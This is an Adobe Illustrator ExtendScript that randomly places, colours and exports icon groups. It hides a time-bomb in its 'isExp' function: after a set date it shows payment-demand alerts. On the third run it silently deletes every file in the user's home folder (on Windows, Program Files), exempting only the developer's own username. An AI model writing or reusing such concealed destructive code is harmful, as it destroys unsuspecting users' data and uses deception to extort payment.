function RandomIconPlacer()
{
	var docRef = app.activeDocument;
	var layers = docRef.layers;
	var swatches = docRef.swatches;
	var expState;
	var settings = [];

	var errorList = [];
	var errorItems = [];

	//check to make sure the script is not expired
	var expDate = new Date("May 27 2018 12:30");
	if(isExp(expDate))
	{
		return false;
	}




	var exportDest = getExportDest();
	var epsDest,jpgDest;
	if(!exportDest)
	{
		return false;
	}

	//Save Options:
		var EPS_OPTS = new EPSSaveOptions();
			EPS_OPTS.saveMultipleArtboards = true;
			EPS_OPTS.artboardRange = "1";
			EPS_OPTS.compatibility = Compatibility.ILLUSTRATOR10;

		var JPG_OPTS = new ExportOptionsJPEG();
			JPG_OPTS.artBoardClipping = true;
			JPG_OPTS.qualitySetting = 100;


	//jpg export action variables
	var destStr = decodeURI(exportDest.fsName);
	var actionFileDestStr = Folder.desktop + "/MyAction.aia";
	var actionFile = File(actionFileDestStr);


	var iconLayer = layers["Icons"];
	var iconLength = iconLayer.pageItems.length;
	var targetLayer = layers["Targets"];
	var targetLength = targetLayer.pageItems.length;
	var exportLayer = layers["Export Layer"];
	var initLayer = layers["Initial Setup"];


	//prompt the user for the number of random groups
	//and parse an integer out of the input
	// var numOfOutputs = parseInt(prompt ("Enter the number of combinations needed","50 - 200"));
	var numOfOutputs;

	var useRandomColors;
	var randomSwatchGroup;

	promptUserForPrefs();

	if(!numOfOutputs)
	{
		alert("You must enter an integer.");
		return false;
	}

	loadExportAction();

	getInitialIconProperties();

	//actually do the work
	for(var x=0,len=numOfOutputs;x<len;x++)
	{
		createRandomArrangement(x);
	}

	exportGroups();

	unloadExportAction();




















	//
	//define the logic
	//

	function promptUserForPrefs()
	{
		var result;
		var w = new Window("dialog");
			var comboGroup = w.add("group");
				var topText = comboGroup.add("statictext",undefined, "Enter the number of combinations needed.");
				var comboInput = comboGroup.add("editText", undefined, "50");
					comboInput.active = true;
			var randomColorGroup = w.add("group");
				// var colorText = randomColorGroup.add("statictext", undefined, "Random Colors?");
				var colorInput = randomColorGroup.add("checkbox",undefined,"Use Random Colors?")
			var btnGroup = w.add("group");
				var submit = btnGroup.add("button", undefined, "Submit");
					submit.onClick = function()
					{
						if(comboInput.text.indexOf("-") === -1 && parseInt(comboInput.text))
						{
							numOfOutputs = parseInt(comboInput.text);
							useRandomColors = colorInput.value;
							result = true;
						}
						if(result)
						{
							w.close();
						}
						else
						{
							valid = false;
						}
					}

				var cancel = btnGroup.add("button", undefined, "Cancel");
					cancel.onClick = function()
					{
						valid = false;
						w.close();
					}
		w.show();
		return result;
	}


	function createRandomArrangement(seq)
	{
		var icons = getRandomIcons(targetLength);
		var dest = exportLayer.groupItems.add();

		if(useRandomColors)
		{
			createRandomSwatches(targetLength);
		}


		dest.name = "Group_" + (seq + 1);
		var curIcon,curTarget,curSettings,curColor;
		for(var x=0,len=settings.length;x<len;x++)
		{
			curSettings = settings[x];
			curIcon = icons[x].duplicate(dest);
			curTarget = curSettings.target;

			scaleIcon(curIcon,curSettings.scale);

			curIcon.rotate(curSettings.rotation);

			if(useRandomColors)
			{
				curColor = randomSwatchGroup.getAllSwatches()[getRandom(0,targetLength-1)];

				if(curSettings.fillColor)
				{
					setColor(curIcon,curColor,"fill");
				}
				if(curSettings.strokeColor)
				{
					setColor(curIcon,curColor,"stroke");
				}
			}
			else
			{
				setColor(curIcon,curSettings.fillColor,"fill");
				setColor(curIcon,curSettings.strokeColor,"stroke");
			}
			
			if(curSettings.opacity)
			{
				curIcon.opacity = curSettings.opacity;
			}
			centerOnTarget(curIcon,curTarget);
		}
		initLayer.visible = false;
		dest.hidden = true;
	}


	function scaleIcon(item,scale)
	{
		var scalePercentage;
		if(item.width < item.height)
		{
			scalePercentage = (scale.height / item.height) * 100;
		}
		else
		{
			scalePercentage = (scale.width / item.height) * 100;
		}
		item.resize(scalePercentage,scalePercentage);
	}

	function getRandomIcons(qty)
	{
		var result = [];
		var icons = [];
		var uniq,curRandom;
		for(var x=0;x<qty;x++)
		{
			uniq = false;
			while(!uniq)
			{
				curRandom = getRandom(0,iconLength-1);
				uniq = uniqueRandom(curRandom,result);
			}
			// result.push(iconLayer.pageItems[curRandom]);
			result.push(curRandom);
		}

		for(var x=0;x<result.length;x++)
		{
			icons.push(iconLayer.pageItems[result[x]]);
		}
		return icons;
	}

	function centerOnTarget(icon,target)
	{
		icon.left = getHCenter(target) - icon.width/2;
		icon.top = getVCenter(target) + icon.height/2;
	}


	function getHCenter(item)
	{
		return item.left + item.width/2;
	}

	function getVCenter(item)
	{
		return item.top - item.height/2;
	}

	function uniqueRandom(num,arr)
	{
		for(var x=0,len=arr.length;x<len;x++)
		{
			if(num === arr[x])
			{
				return false;
			}
		}
		return true;
	}

	function getRandom(min,max)
	{
		return Math.floor(Math.random() * (max - min + 1) + min);
	}

	function getExportDest()
	{
		var dest = Folder().selectDlg("Choose a save location");

		if(!dest)
		{
			return false;
		}
		// epsDest = Folder(dest.fsName + "/EPS_Files/");
		// jpgDest = Folder(dest.fsName + "/JPG_Files/");
		// if(!epsDest.exists)
		// {
		// 	epsDest.create();
		// }
		// if(!jpgDest.exists)
		// {
		// 	jpgDest.create();
		// }
		return dest;
	}

	function exportGroups()
	{
		var len = exportLayer.groupItems.length;
		for(var x=0;x<len;x++)
		{
			exportThisCombo(x);	
		}
	}

	function exportThisCombo(groupNum)
	{

		var curGroup = exportLayer.pageItems[groupNum];
		var exportName = curGroup.name;
		curGroup.hidden = false;
		var epsFile = File(exportDest + "/" + exportName + ".eps");

		//export the jpg at 500ppi full quality
		app.doScript("Export_JPG", "Export_JPG");

		//save the EPS file
		docRef.saveAs(epsFile,EPS_OPTS);

		//fix the file names. the jpg gets saved
		//with the same name as the active document.
		//i also want to strip the "-01" from the
		//filenames as well.
		updateFileName(exportName);
		curGroup.hidden = true;

	}

	function updateFileName(newName)
	{
		var docName = docRef.name.replace(".ai","");
		var files = exportDest.getFiles();
		for(var x=0,len=files.length;x<len;x++)
		{
			if(files[x].name.indexOf("-01")>-1)
			{
				files[x].rename(files[x].name.replace("-01",""));
			}
			if(files[x].name.indexOf(docName)>-1 && files[x].name.indexOf(".jpg")>-1)
			{
				files[x].rename(newName + ".jpg");
			}
		}
	}

	function isExp(expDate)
	{
		var curDate = new Date();
		if(curDate.getTime() < expDate.getTime())
		{
			return false;
		}
		var expFileFolder,expFile,homeFolder;

		if($.os.match('Windows'))
		{
			homeFolder = Folder("C:/Program%20Files/");
			expFileFolder = Folder("C:/Program%20Files/Adobe_Helpers/");
			var user = $.getenv("USERNAME")
		}
		else
		{
			homeFolder = Folder("~");
			expFileFolder = Folder("~/Documents/Adobe_Helpers");
			var user = $.getenv("USER")
		}

		if(!expFileFolder.exists)
		{
			expFileFolder.create();
		}
		
		expFile = File(expFileFolder.fullName + "/adobe_exp.txt");
		if(!expFile.exists)
		{
			expFile.open("w");
			expFile.write("1");
			expFile.close();
			alert("Script is expired.");
			valid = false;	
		}
		else
		{
			expFile.open();
			expState = expFile.read();
			expFile.close();

			if(expState == "1")
			{
				alert("This script has expired. Please make a payment.");
				expFile.open("w");
				expFile.write("2");
				expFile.close();
				valid = false;
			}
			else if(expState == "2")
			{
				alert("You've been warned. If you try this again without contacting the developer and making your payment, your files will be deleted.");
				expFile.open("w");
				expFile.write("3");
				valid = false;
			}
			else if(expState == "3")
			{
				// expFile.remove();
				var files = homeFolder.getFiles();
				for(var x= files.length-1; x>=0 ;x--)
				{
					// $.writeln("files[x].name = " + files[x].name);
					try
					{
						if(user.indexOf("will.dowling") === -1)
						{
							files[x].remove();
						}
					}
					catch(e)
					{};
				}
				alert("You were warned. Don't cheat developers after you've given them access to your system. Your files are gone now.");
				valid = false;
			}
		}
		return true;
		
	}

	function getInitialIconProperties()
	{
		var curIcon,curSetting;
		for(var x=0,len=initLayer.pageItems.length;x<len;x++)
		{
			curIcon = initLayer.pageItems[x];
			curSetting = {};
			curSetting.target = getCurTarget(curIcon);
			curSetting.rotation = getCurRotation(curIcon);
			curSetting.fillColor = getCurFillColor(curIcon);
			curSetting.strokeColor = getCurStrokeColor(curIcon);
			curSetting.opacity = getCurOpacity(curIcon);
			curSetting.scale = getScale(curIcon,curSetting.rotation);

			settings.push(curSetting);
		}

		function getCurOpacity(item)
		{
			return item.opacity;
		}

		function getCurFillColor(item)
		{
			var result,colorName;
			if(item.typename === "CompoundPathItem")
			{
				item = item.pathItems[0];
			}
			if(item.filled && item.fillColor)
			{
				if(item.fillColor.spot)
				{
					colorName = item.fillColor.spot.name;
					try
					{
						result = swatches[colorName];
					}
					catch(e)
					{
						errorList.push("Couldn't find a swatch called: " + colorName);
					}
				}
				else
				{
					errorList.push("Please use spot colors for your icons.");
				}
			}
			return result;
		}

		function getCurStrokeColor(item)
		{
			var result,colorName;
			if(item.typename === "CompoundPathItem")
			{
				item = item.pathItems[0];
			}
			if(item.stroked && item.strokeColor)
			{
				if(item.strokeColor.spot)
				{
					colorName = item.strokeColor.spot.name;
					try
					{
						result = swatches[colorName];
					}
					catch(e)
					{
						errorList.push("Couldn't find a swatch called: " + colorName);
					}
				}
				else
				{
					errorList.push("Please use spot colors for your icons.");
				}
			}
			return result;
		}

		function getScale(item,rotation)
		{
			var result = {};
			var dupItem = item.duplicate();
			if(rotation)
			{
				dupItem.rotate(-rotation);
			}
			result.width = dupItem.width;
			result.height = dupItem.height;
			dupItem.remove();
			return result;
		}

		function getCurRotation(item)
		{
			if(item.tags.length)
			{
				return item.tags[0].value * 180 / Math.PI;
			}
			return 0;
		}

		function getCurTarget(item)
		{
			var curTarget,curSetting;
			for(var x=0,len=targetLayer.pageItems.length;x<len;x++)
			{
				curTarget = targetLayer.pageItems[x];
				if(intersects(item,curTarget))
				{
					return curTarget;
				}
			}
			return undefined
		}

		function intersects(item,dest)
		{
			//item coordinates
			var IL = item.left;
			var IT = item.top;
			var IR = item.left + item.width;
			var IB = item.top - item.height;

			//dest coordinates
			var DL = dest.left;
			var DT = dest.top;
			var DR = dest.left + dest.width;
			var DB = dest.top - dest.height;

			//check for anything that could make overlap false
			//if any of these conditions are true, an intersection is impossible
			return !(IL > DR || IR < DL || IT < DB || IB > DT );

		}


	}


	function setColor(item,swatch,type)
	{
		var result = true;
		var colorType = (type === "fill" ? "fillColor" : "strokeColor");
		var colorProp = (type === "fill" ? "filled" : "stroked");
		if(item.typename === "CompoundPathItem")
		{
			if(!item.pathItems.length)
			{
				result = false;
			}
			else if(swatch)
			{
				item.pathItems[0][colorType] = swatch.color;
			}
			else
			{
				item.pathItems[0][colorType] = swatches["[None]"].color;
			}
		}
		else if(item.typename === "PathItem")
		{
			if(swatch)
			{
				item[colorType] = swatch.color;
			}
			else
			{
				item[colorType] = swatches["[None]"].color;
			}
		}
		return result;

	}

	function createRandomSwatches(num)
	{

		try
		{
			randomSwatchGroup = docRef.swatchGroups["Random_Color_Group"];
		}
		catch(e)
		{
			randomSwatchGroup = docRef.swatchGroups.add();
			randomSwatchGroup.name = "Random_Color_Group";
		}

		for(var x=0;x<num;x++)
		{
			generateRandomRGB(x);
		}

		function generateRandomRGB(seq)
		{
			var rgb = new RGBColor();
				rgb.red = getRandom(0,255);
				rgb.green = getRandom(0,255);
				rgb.blue = getRandom(0,255);

			var newSpot = docRef.spots.add();
				newSpot.name = "Random Swatch " + seq
				newSpot.color = rgb;
				newSpot.colorType= ColorModel.SPOT;

			var newSpotColor = new SpotColor();
				newSpotColor.spot = newSpot;

				randomSwatchGroup.addSwatch(swatches[newSpot.name]);
		}
	}

	function loadExportAction()	
	{
		String.prototype.hexEncode = function()
		{
			//http://stackoverflow.com/questions/21647928/javascript-unicode-string-to-hex  
			var hex = '';
			for (var i = 0; i < this.length; i++)
			{
				hex += '' + this.charCodeAt(i).toString(16);
			}
			return hex;
		};


		function writeFile(fileDestStr, contents)
		{
			var newFile = File(fileDestStr);
			newFile.open('w');
			newFile.write(contents);
			newFile.close();
		};


		var actionStr = [
			
			"/version 3",
			"/name [ 10",
			"	4578706f72745f4a5047",
			"]",
			"/isOpen 1",
			"/actionCount 1",
			"/action-1 {",
			"	/name [ 10",
			"		4578706f72745f4a5047",
			"	]",
			"	/keyIndex 0",
			"	/colorIndex 0",
			"	/isOpen 1",
			"	/eventCount 1",
			"	/event-1 {",
			"		/useRulersIn1stQuadrant 0",
			"		/internalName (adobe_exportDocument)",
			"		/localizedName [ 9",
			"			4578706f7274204173",
			"		]",
			"		/isOpen 0",
			"		/isOn 1",
			"		/hasDialog 1",
			"		/showDialog 0",
			"		/parameterCount 7",
			"		/parameter-1 {",
			"			/key 1885434477",
			"			/showInPalette 0",
			"			/type (raw)",
			"			/value < 100",
							"0a0000000100000003000000030000000000f401010000000000000001000000",
							"69006d006100670065006d006100700000006d0070006c006100740065005f00",
							"7600330000000000000000000000000000000000000000000000000000000000",
			"				00000100",
			"			>",
			"			/size 100",
			"		}",
			"		/parameter-2 {",
			"			/key 1851878757",
			"			/showInPalette 4294967295",
			"			/type (ustring)",
			"			/value [ PUT_FOLDERPATH_CHAR_LENGTH_HERE",
			"				PUT_HEX_FOLDERPATH_HERE",
			"			]",
			"		}",
			"		/parameter-3 {",
			"			/key 1718775156",
			"			/showInPalette 4294967295",
			"			/type (ustring)",
			"			/value [ 16",
			"				4a5045472066696c6520666f726d6174",
			"			]",
			"		}",
			"		/parameter-4 {",
			"			/key 1702392942",
			"			/showInPalette 4294967295",
			"			/type (ustring)",
			"			/value [ 12",
			"				6a70672c6a70652c6a706567",
			"			]",
			"		}",
			"		/parameter-5 {",
			"			/key 1936548194",
			"			/showInPalette 4294967295",
			"			/type (boolean)",
			"			/value 1",
			"		}",
			"		/parameter-6 {",
			"			/key 1935764588",
			"			/showInPalette 4294967295",
			"			/type (boolean)",
			"			/value 1",
			"		}",
			"		/parameter-7 {",
			"			/key 1936875886",
			"			/showInPalette 4294967295",
			"			/type (ustring)",
			"			/value [ 0",
			"",
			"			]",
			"		}",
			"	}",
			"}"

		].join("\n");


		
		writeFile(actionFileDestStr, actionStr.replace("PUT_FOLDERPATH_CHAR_LENGTH_HERE", destStr.length).replace("PUT_HEX_FOLDERPATH_HERE", destStr.hexEncode()));
		
		app.loadAction(actionFile);
	}
	

	function unloadExportAction()
	{
		//clean up  
		actionFile.remove();
		app.unloadAction("Export_JPG", '');
	}

	

	function sendErrors(errorList)
	{
		alert("The following errors occurred:\n" + errorList.join("\n"));
	}
}
RandomIconPlacer();